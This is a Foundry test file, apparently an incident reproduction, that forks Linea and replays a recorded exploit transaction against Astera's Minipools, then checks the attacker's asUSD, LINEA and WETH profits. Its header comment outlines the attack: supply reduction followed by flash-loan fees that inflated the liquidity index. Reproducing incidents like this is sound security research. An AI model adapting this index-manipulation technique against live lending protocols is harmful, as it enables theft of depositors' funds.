// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

/*
    @KeyInfo
    - Total Lost: ~$822K
    - Attacker: 0x61EA1C91d7aE9782223384fAFe3ad81fFb8E0b45
    - Attack Contract: 0xcd69567080Dccad1Afe61aCc022c0A7164B29AB4
    - Final Drain Tx: https://lineascan.build/tx/0xc574372f7411415a791e00076582b7f222214049b706991c8b40e2b7a7e7b988

    Astera's Minipool unwrap path reduced asUSDT supply to a tiny base. Repeated
    flash-loan fees then inflated the liquidity index roughly 154x, overvaluing
    the attacker's collateral. This replays the final permissionless drain from
    the three affected Minipools after the on-chain index-manipulation sequence.
*/

interface IERC20Astera {
    function balanceOf(
        address account
    ) external view returns (uint256);
}

contract AsteraExploitTest is Test {
    bytes32 private constant ATTACK_TX = 0xc574372f7411415a791e00076582b7f222214049b706991c8b40e2b7a7e7b988;
    address private constant ATTACKER = 0x61EA1C91d7aE9782223384fAFe3ad81fFb8E0b45;
    IERC20Astera private constant AS_USD = IERC20Astera(0xa500000000e482752f032eA387390b6025a2377b);
    IERC20Astera private constant LINEA = IERC20Astera(0x1789e0043623282D5DCc7F213d703C6D8BAfBB04);
    IERC20Astera private constant WETH = IERC20Astera(0xe5D7C2a44FfDDf6b295A15c148167daaAf5Cf34f);

    function setUp() public {
        vm.createSelectFork("linea", 24_321_903);
    }

    function testExploit() public {
        uint256 asUsdBefore = AS_USD.balanceOf(ATTACKER);
        uint256 lineaBefore = LINEA.balanceOf(ATTACKER);
        uint256 wethBefore = WETH.balanceOf(ATTACKER);

        vm.transact(ATTACK_TX);

        uint256 asUsdProfit = AS_USD.balanceOf(ATTACKER) - asUsdBefore;
        uint256 lineaProfit = LINEA.balanceOf(ATTACKER) - lineaBefore;
        uint256 wethProfit = WETH.balanceOf(ATTACKER) - wethBefore;
        emit log_named_decimal_uint("asUSD profit", asUsdProfit, 18);
        emit log_named_decimal_uint("LINEA profit", lineaProfit, 18);
        emit log_named_decimal_uint("WETH profit", wethProfit, 18);

        assertEq(asUsdProfit, 442_856.704179520116780032e18);
        assertEq(lineaProfit, 12_551_858.83362192615362557e18);
        assertEq(wethProfit, 18.942083190626072519e18);
    }
}
